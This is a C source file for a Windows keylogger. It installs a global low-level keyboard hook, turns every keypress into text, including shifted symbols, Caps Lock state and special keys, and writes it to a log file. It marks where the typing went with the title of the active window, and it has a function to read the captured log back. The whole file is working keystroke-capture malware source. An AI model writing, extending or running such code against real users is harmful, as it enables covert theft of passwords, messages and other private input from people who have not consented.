#include "logger.h"
#include "keylogger_utils.h"
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "User32.lib")

SPECIAL_KEY specials[] = {
	{VK_LSHIFT, FALSE, ""},
	{VK_RSHIFT, FALSE, ""},
	{VK_LCONTROL, FALSE, " CTRL "},
	{VK_RCONTROL, FALSE, " CTRL "},
	{VK_LMENU, FALSE, " ALT "},
	{VK_RMENU, FALSE, " ALT "},
	{VK_CAPITAL, FALSE, ""},
	{VK_SPACE, FALSE, " "},
	{VK_LEFT, FALSE, " LEFT "},
	{VK_RIGHT, FALSE, " RIGHT "},
	{VK_DELETE, FALSE, " DEL "},
	{VK_BACK, FALSE, " BACK "},
	{VK_RETURN, FALSE, "\n"},
	{VK_LWIN, FALSE, " WIN "},
	{VK_TAB, FALSE, " TAB "}
};
int specials_len = sizeof(specials) / sizeof(SPECIAL_KEY);

SYMBOL symbols[] = {
	{VK_LSHIFT, NUM_START + 1, "!"},
	{VK_LSHIFT, NUM_START + 2, "@"},
	{VK_LSHIFT, NUM_START + 3, "#"},
	{VK_LSHIFT, NUM_START + 4, "$"},
	{VK_LSHIFT, NUM_START + 5, "%"},
	{VK_LSHIFT, NUM_START + 6, "^"},
	{VK_LSHIFT, NUM_START + 7, "&"},
	{VK_LSHIFT, NUM_START + 8, "*"},
	{VK_LSHIFT, NUM_START + 9, "("},
	{VK_LSHIFT, NUM_START + 0, ")"},
	{VK_LSHIFT, VK_OEM_1, ":"},
	{VK_LSHIFT, VK_OEM_2, "?"},
	{VK_LSHIFT, VK_OEM_3, "~"},
	{VK_LSHIFT, VK_OEM_4, "{"},
	{VK_LSHIFT, VK_OEM_5, "|"},
	{VK_LSHIFT, VK_OEM_6, "}"},
	{VK_LSHIFT, VK_OEM_7, "\""},
	{VK_LSHIFT, VK_OEM_MINUS, "_"},
	{VK_LSHIFT, VK_OEM_COMMA, "<"},
	{VK_LSHIFT, VK_OEM_PERIOD, ">"},
	{0, VK_OEM_1, ";"},
	{0, VK_OEM_2, "/"},
	{0, VK_OEM_3, "`"},
	{0, VK_OEM_4, "["},
	{0, VK_OEM_5, "\\"},
	{0, VK_OEM_6, "]"},
	{0, VK_OEM_7, "'"},
	{0, VK_OEM_PLUS, "+"},
	{0, VK_OEM_COMMA, ","},
	{0, VK_OEM_MINUS, "-"},
	{0, VK_OEM_PERIOD, "."}
};
int symbols_len = sizeof(symbols) / sizeof(SYMBOL);

BOOL caps_lock_on = FALSE; // assuming caps lock is off when starting program
HANDLE logger_file_handle = NULL;
HWND prev_window = NULL;
HHOOK hhk_low_level_hook = { 0 };

unsigned int __stdcall start_logging(void* _) {
	MSG msg = { 0 };

	logger_file_handle = CreateFileA(LOG_FILENAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
		NULL, CREATE_ALWAYS, 0, NULL);
	if (logger_file_handle == INVALID_HANDLE_VALUE) {
		printf("An error occoured while trying to open file: %d\n", GetLastError());
		return 0;
	}
	printf("starting to log keyboard input\n");
	hhk_low_level_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	while (GetMessage(&msg, NULL, 0, 0) != 0);
	UnhookWindowsHookEx(hhk_low_level_hook);
	CloseHandle(logger_file_handle);
	printf("stopped logging\n");
	return 1;
}

int log_number(int key_code){
	DWORD bytes_written = 0;
	char text_to_write[2] = { 0 };

	if (lkey_or_rkey_down(VK_LSHIFT))
		return 0;

	text_to_write[0] = (char) key_code;
	WriteFile(logger_file_handle, text_to_write, sizeof(text_to_write), &bytes_written, NULL);
	return 1;
}

void log_letter(int key_code) {
	DWORD bytes_written = 0;
	char text_to_write[2] = { 0 };
	BOOL is_upper_case = lkey_or_rkey_down(VK_LSHIFT) || caps_lock_on;
	
	if (!is_upper_case)
		key_code += CASE_DELTA;
	text_to_write[0] = (char)key_code;
	WriteFile(logger_file_handle, text_to_write, sizeof(text_to_write), &bytes_written, NULL);
}

void log_special(SPECIAL_KEY* special_key) {
	DWORD bytes_written = 0;

	WriteFile(logger_file_handle, special_key->repr, sizeof(special_key->repr), &bytes_written, NULL);
	if (special_key->key_code == VK_CAPITAL)
		caps_lock_on ^= 1;
}

void log_symbols(int key_code) {
	DWORD bytes_written = 0;
	BOOL special_key_down = FALSE;
	int i = 0;

	for (; i < symbols_len; i++)
	{
		if (symbols[i].key_code == key_code) {
			if (symbols[i].special_key == 0) {
				WriteFile(logger_file_handle, symbols[i].repr, sizeof(symbols[i].repr), &bytes_written, NULL);
				return;
			}
			else {
				special_key_down = lkey_or_rkey_down(symbols[i].special_key);
				if (special_key_down) {
					WriteFile(logger_file_handle, symbols[i].repr, sizeof(symbols[i].repr), &bytes_written, NULL);
					return;
				}
			}
		}
	}
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
	int key_code = p->vkCode;
	SPECIAL_KEY* special_key = { 0 };
	DWORD bytes_written = 0;
	LPSTR title = (LPSTR) calloc(MAX_TITLE_LEN, sizeof(LPSTR));
	HWND cur_window = GetForegroundWindow();
	
	if (prev_window != cur_window)	{
		GetWindowText(cur_window, title, MAX_TITLE_LEN);
		WriteFile(logger_file_handle, "\n-----", sizeof("\n-----"), &bytes_written, NULL);
		WriteFile(logger_file_handle, title, strnlen((char*)title, MAX_TITLE_LEN), &bytes_written, NULL);
		WriteFile(logger_file_handle, "-----\n", sizeof("-----\n"), &bytes_written, NULL);
		prev_window = cur_window;
	}
	if (nCode == HC_ACTION) {
		switch (wParam) {
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
				if (key_code >= LETTERS_START && key_code <= LETTERS_END) {
					log_letter(key_code);
					break;
				}
				if ((key_code >= NUM_START && key_code <= NUM_END) ||
					(key_code >= NUM_START + NUMPAD_DELTA && key_code <= NUM_END + NUMPAD_DELTA)) {
					if(log_number(key_code))
						break;
				}
				special_key = get_special_key_by_key_code(key_code, specials, specials_len);
				if (special_key != NULL) {
					log_special(special_key);
					special_key->down = TRUE;
					break;
				}
				if (key_code_in_symbols(key_code, symbols, symbols_len)) {
					log_symbols(key_code);
					break;
				}
				break;

			case WM_KEYUP:
			case WM_SYSKEYUP:
				if (key_code >= LETTERS_START && key_code <= LETTERS_END ||
					(key_code >= NUM_START && key_code <= NUM_END) ||
					(key_code >= NUM_START + NUMPAD_DELTA && key_code <= NUM_END + NUMPAD_DELTA))
					break;
				special_key = get_special_key_by_key_code(key_code, specials, specials_len);
				if (special_key != NULL) {
					special_key->down = FALSE;
					break;
				}
				break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL lkey_or_rkey_down(int lkey_code) {
	BOOL lkey_down;
	BOOL rkey_down;

	lkey_down = get_special_key_by_key_code(lkey_code, specials,
		specials_len)->down;
	rkey_down = get_special_key_by_key_code(lkey_code + 1, specials,
		specials_len)->down;

	return lkey_down || rkey_down;
}

void read_file(char* buffer, LPDWORD bytes_read, int max_bytes_to_read) {
	HANDLE file = CreateFile(LOG_FILENAME, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("An error occoured while trying to open file: %d\n", GetLastError());
		return;
	}
	ReadFile(file, buffer, max_bytes_to_read, bytes_read, NULL);
}